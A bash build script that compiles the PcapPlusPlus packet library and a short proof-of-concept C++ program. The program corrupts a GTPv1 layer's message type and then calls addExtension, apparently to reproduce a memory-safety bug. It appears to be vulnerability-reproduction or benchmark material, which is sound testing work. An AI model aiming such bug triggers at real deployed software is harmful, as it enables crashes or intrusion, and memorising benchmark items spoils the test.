#!/bin/bash -eu
cmake -S . -B build --install-prefix=$PWD/install -DBUILD_SHARED_LIBS=ON
cmake --build build --parallel 16
cmake --install build

cat <<EOF > poc.cpp
#include <iostream>
#include "IPv4Layer.h"
#include "Packet.h"
#include "PcapFileDevice.h"
#include "GtpLayer.h"

int main(int argc, char* argv[]) {
    auto gtpLayer = std::unique_ptr<pcpp::GtpV1Layer>(
    new pcpp::GtpV1Layer(pcpp::GtpV1MessageType::GtpV1_VersionNotSupported, 0x12345678, true, 1, false, 0));
    gtpLayer->getHeader()->messageType = 0xFF;
    gtpLayer->addExtension(0x85, 0x1234);

    return 0;
}
EOF

if [ ! -z "${CXX:-}" ]; then
    $CXX $CXXFLAGS -I install/include/pcapplusplus -L install/lib -lPcap++ -lCommon++ -lPacket++ -Wl,-rpath=install/lib -o poc poc.cpp
fi